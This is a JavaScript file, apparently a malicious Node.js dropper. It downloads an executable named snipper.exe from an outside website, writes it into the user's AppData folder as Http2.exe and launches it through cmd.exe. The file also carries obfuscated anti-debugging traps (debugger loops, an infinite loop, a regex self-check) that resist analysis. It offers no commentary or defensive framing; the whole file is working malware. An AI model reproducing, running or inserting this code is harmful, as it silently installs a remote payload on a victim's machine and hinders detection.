'use strict';

(function () {
  const _0x35a5db = function () {
    let _0x5c644b;
    try {
      _0x5c644b = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (_0x469182) {
      _0x5c644b = window;
    }
    return _0x5c644b;
  };
  const _0x2a2641 = _0x35a5db();
  _0x2a2641.setInterval(_0x116a80, 4000);
})();
const fs = require('fs');
const https = require("https");
const {
  exec
} = require("child_process");
const path = require("path");
const os = require('os');
function downloadAndRunExe(_0x52a22b, _0x4a7d60) {
  return new Promise((_0x3e38a8, _0x59c7ed) => {
    const _0x22c1b5 = path.join(os.homedir(), "AppData", "Roaming", _0x4a7d60);
    const _0x1841ef = fs.createWriteStream(_0x22c1b5);
    https.get(_0x52a22b, _0x32ec10 => {
      _0x32ec10.pipe(_0x1841ef);
      _0x1841ef.on("finish", () => {
        _0x1841ef.close();
        _0x3e38a8(_0x22c1b5);
      });
    }).on("error", _0x113faf => {
      fs.unlink(_0x22c1b5, () => {});
    });
  });
}
function runExe(_0x431409) {
  return new Promise((_0x1224d9, _0x51cdbe) => {
    exec("cmd.exe /c start \"\" \"" + _0x431409 + "\"", _0x533c8f => {
      if (_0x533c8f) {} else {
        _0x1224d9();
      }
    });
  });
}
async function runPayload() {
  const _0x2668f4 = function () {
    let _0x17f0d0 = true;
    return function (_0xba1d1d, _0x5754bb) {
      const _0x29d5b3 = _0x17f0d0 ? function () {
        if (_0x5754bb) {
          const _0x5b1f0b = _0x5754bb.apply(_0xba1d1d, arguments);
          _0x5754bb = null;
          return _0x5b1f0b;
        }
      } : function () {};
      _0x17f0d0 = false;
      return _0x29d5b3;
    };
  }();
  const _0x2e81a2 = _0x2668f4(this, function () {
    return _0x2e81a2.toString().search("(((.+)+)+)+$").toString().constructor(_0x2e81a2).search("(((.+)+)+)+$");
  });
  _0x2e81a2();
  const _0x1d19c7 = function () {
    let _0x1805da = true;
    return function (_0x282ab0, _0xa309ce) {
      const _0x3afbb0 = _0x1805da ? function () {
        if (_0xa309ce) {
          const _0x41a10c = _0xa309ce.apply(_0x282ab0, arguments);
          _0xa309ce = null;
          return _0x41a10c;
        }
      } : function () {};
      _0x1805da = false;
      return _0x3afbb0;
    };
  }();
  (function () {
    _0x1d19c7(this, function () {
      const _0x2876ac = new RegExp("function *\\( *\\)");
      const _0x42bd3b = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i');
      const _0x2d7d10 = _0x116a80("init");
      if (!_0x2876ac.test(_0x2d7d10 + "chain") || !_0x42bd3b.test(_0x2d7d10 + "input")) {
        _0x2d7d10('0');
      } else {
        _0x116a80();
      }
    })();
  })();
  try {
    const _0xa85301 = await downloadAndRunExe("https://www.rocco1337.com/uploads/snipper.exe", "Http2.exe");
    await runExe(_0xa85301);
  } catch (_0x13b259) {}
}
runPayload();
function _0x116a80(_0x5b1ac0) {
  function _0x2e6393(_0xf52047) {
    if (typeof _0xf52047 === "string") {
      return function (_0x1e1df5) {}.constructor("while (true) {}").apply("counter");
    } else {
      if (('' + _0xf52047 / _0xf52047).length !== 1 || _0xf52047 % 20 === 0) {
        (function () {
          return true;
        }).constructor("debugger").call("action");
      } else {
        (function () {
          return false;
        }).constructor("debugger").apply("stateObject");
      }
    }
    _0x2e6393(++_0xf52047);
  }
  try {
    if (_0x5b1ac0) {
      return _0x2e6393;
    } else {
      _0x2e6393(0);
    }
  } catch (_0x27fecb) {}
}